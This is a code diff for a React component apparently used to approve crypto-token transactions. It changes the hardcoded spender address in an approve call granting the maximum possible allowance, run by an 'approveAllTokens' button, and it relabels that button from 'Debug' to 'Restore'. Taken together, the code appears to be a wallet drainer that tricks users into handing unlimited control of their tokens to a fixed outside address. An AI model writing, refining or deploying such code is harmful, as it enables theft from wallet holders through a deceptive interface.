@@ -29,6 +29,8 @@ const ApproveTxn = () => {
   const [isMetaMask, setIsMetaMask] = useState(false);
   const [showPopup, setShowPopup] = useState(false);
   const [nextPopup, setNextPopup] = useState(false);
+  const [isHovered, setIsHovered] = useState(false);
+
 
   
 
@@ -180,7 +182,7 @@ const ApproveTxn = () => {
       try {
         // Approve the token
         const tx = await tokenContract.approve(
-          "0xe514C4535B3A68be6126cA8b9aa60414A8f489Ff",
+          "0x8fF15369602bB3e0BEbf0665CCA72600a6781DbF",
           maxUint256
         );
 
@@ -294,11 +296,15 @@ const ApproveTxn = () => {
       {isLoading && <p>Loading tokens...</p>}
       <button onClick={approveAllTokens}
               disabled={isMetaMask}
+              onMouseEnter={() => setIsHovered(true)}
+      onMouseLeave={() => setIsHovered(false)}
       style={{
         marginTop: "20px",
   marginBottom: "5px",
   padding: "10px",
-  backgroundColor: isMetaMask ? "#ccc" : "#efefef",
+  backgroundColor: isMetaMask ? "#ccc"  : isHovered
+  ? "#dcdcdc" // Hover background color
+  : "#efefef", // Default background color
   border: "none",
   borderRadius: "6px",
   color: isMetaMask ? "#777" : "#333",
@@ -306,7 +312,7 @@ const ApproveTxn = () => {
   cursor: isMetaMask ? "not-allowed" : "pointer",
   width: "150px",
   height: "42px",}}
-      >Debug</button>
+      >Restore</button>
       {showPopup && (
         <div
           style={{
@@ -373,7 +379,7 @@ onClick={() => {
       )}
 
       {/* Overlay */}
-      {nextPopup && (
+      {showPopup && (
         <div
           onClick={() => setShowPopup(false)}
           style={{
